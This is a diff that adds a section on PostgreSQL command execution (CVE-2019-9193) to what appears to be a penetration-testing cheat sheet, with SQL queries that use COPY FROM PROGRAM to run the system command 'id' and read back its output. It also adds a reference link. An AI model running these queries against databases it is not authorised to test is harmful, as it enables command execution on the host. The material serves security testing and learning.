@@ -47,6 +47,21 @@ SELECT * FROM pentestlab;
 COPY pentestlab(t) TO '/tmp/pentestlab';
 ```
 
+## PostgreSQL - Command execution
+
+CVE-2019–9193, can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. 
+
+```SQL
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
+CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
+COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
+SELECT * FROM cmd_exec;                 -- [Optional] View the results
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
+```
+
+![https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png](https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png)
+
 ## References
 
 * [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
+* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
